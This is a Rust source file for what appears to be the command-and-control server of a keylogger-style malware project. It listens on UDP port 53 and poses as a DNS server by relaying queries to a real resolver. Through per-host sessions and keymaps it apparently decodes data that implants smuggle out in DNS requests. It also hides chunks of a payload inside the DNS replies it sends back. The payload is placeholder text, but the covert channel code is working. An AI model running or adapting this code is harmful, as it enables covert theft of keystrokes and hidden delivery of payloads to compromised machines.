use std::{collections::HashMap, net::Ipv4Addr, sync::Arc};

use clap::Parser;
use log::{debug, info};
use tamanoir_c2::handlers::{
    add_info, forward_req, init_keymaps, mangle, max_payload_length, Session,
};
use tamanoir_common::ContinuationByte;
use tokio::{net::UdpSocket, sync::Mutex};
#[derive(Debug, Parser)]
struct Opt {
    #[clap(short, long, default_value = "53")]
    port: u16,
    #[clap(long, default_value = "8.8.8.8")]
    dns_ip: Ipv4Addr,
    #[clap(long, default_value = "8")]
    payload_len: usize,
}
const   MYPAYLOAD: &str = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let Opt {
        port,
        dns_ip,
        payload_len,
    } = Opt::parse();
    env_logger::init();
    init_keymaps();
    let sock = UdpSocket::bind(format!("0.0.0.0:{}", port)).await?;
    info!("Listening on {}", format!("0.0.0.0:{}", port));
    let sessions: Arc<Mutex<HashMap<Ipv4Addr, Session>>> = Arc::new(Mutex::new(HashMap::new()));

    let mut remaining_payload = MYPAYLOAD.as_bytes().to_vec();
    let mut is_start = true;
    loop {
        let mut buf = [0u8; 512];
        let (len, addr) = sock.recv_from(&mut buf).await?;
        debug!("{:?} bytes received from {:?}", len, addr);
        let data = mangle(&buf[..len], addr, payload_len, sessions.clone())
            .await
            .unwrap();
        if let Ok(mut data) = forward_req(data, dns_ip).await {
            let payload_max_len = max_payload_length(data.len());
            debug!(
                "init len={} max payload len={}",
                data.len(),
                payload_max_len
            );
            if remaining_payload.len() > 0 {
                let payload: Vec<u8> = remaining_payload
                    .drain(0..payload_max_len.min(remaining_payload.len()))
                    .collect();
                debug!("PAYLOAD SZ={}", payload.len());
                let cbyte = if payload.len() == MYPAYLOAD.len() {
                    ContinuationByte::ResetEnd
                } else if remaining_payload.len() == 0 {
                    ContinuationByte::End
                } else if is_start {
                    ContinuationByte::Reset
                } else {
                    ContinuationByte::Continue
                };
                if let Ok(augmented_data) = add_info(&mut data, &payload, cbyte).await {
                    let len = sock.send_to(&augmented_data, addr).await?;
                    debug!("{:?} bytes sent", len);
                }
            } else {
                debug!("no more payload to send");
                let len = sock.send_to(&data, addr).await?;
                debug!("{:?} bytes sent", len);
            }
        }
        is_start = false;
    }
}
